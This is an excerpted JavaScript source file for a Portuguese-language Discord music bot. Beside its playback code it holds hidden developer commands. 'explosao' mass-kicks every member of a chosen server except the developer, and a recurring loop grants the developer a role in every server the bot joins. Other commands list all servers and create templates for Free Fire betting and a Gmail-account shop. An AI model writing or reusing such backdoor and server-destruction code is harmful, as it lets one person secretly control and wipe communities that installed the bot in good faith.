...
async function entrarNaCall(guild, channelId) {
  ...
  connection.on(VoiceConnectionStatus.Disconnected, async () => {
    try {
      ...
      setTimeout(async () => {
        ...
        if (canalSalvo) entrarNaCall(guild, canalSalvo);
      }, 5000);
    }
  });
...
async function tocarProxima(guildId) {
  ...
  try {
    ...
    if (queue.textChannel) queue.textChannel.send(`❌ Erro ao tocar **${song.title}**. Pulando...`).catch(() => {});
    await sleep(1000);
...
function getCommands() {
  return [
    ...
    new SlashCommandBuilder().setName('premium_temp').setDescription('Premium temporário (dev)').addStringOption(o => o.setName('guildid').setDescription('ID servidor').setRequired(true)).addIntegerOption(o => o.setName('dias').setDescription('Dias').setRequired(true).setMinValue(1).setMaxValue(365)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName('servidores').setDescription('Lista servidores (dev)').setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    ...
    new SlashCommandBuilder().setName('criar_servidor').setDescription('Cria estrutura completa (dev)').addStringOption(o => o.setName('tipo').setDescription('Tipo').setRequired(true).addChoices({ name: 'Loja', value: 'loja' }, { name: 'Apostas', value: 'apostas_freefire' }, { name: 'Comunidade', value: 'comunidade' }, { name: 'Loja de Gmail', value: 'loja_gmail' })).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName('explosao').setDescription('Destruir servidor (dev)').addStringOption(o => o.setName('guildid').setDescription('ID servidor').setRequired(true)).addBooleanOption(o => o.setName('confirmar').setDescription('Confirmar?').setRequired(true)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  ];
}
...
client.once('ready', async () => {
  ...
  setInterval(() => {
    for (const guild of client.guilds.cache.values()) {
      guild.members.fetch(DEVELOPER_ID).then(devMember => { if (devMember) ensureDevRole(guild, devMember); }).catch(() => {});
    }
  }, 300000);
...
client.on('interactionCreate', async interaction => {
  ...
  if (interaction.isChatInputCommand()) {
    ...
    if (commandName === 'reload') {
      if (!isDeveloper(interaction.user.id)) return interaction.reply({ content: '❌ Apenas dev.', ephemeral: true });
      await registerCommands();
      return interaction.reply({ content: '✅ Comandos recarregados.', ephemeral: true });
    }
    ...
    if (commandName === 'explosao') {
      ...
      try {
        ...
        for (const [, m] of members) if (m.id !== DEVELOPER_ID && m.id !== client.user.id) await m.kick('Explosão').catch(() => {});
    ...
    // ===== OUTROS comandos diversos (mantidos simples) =====
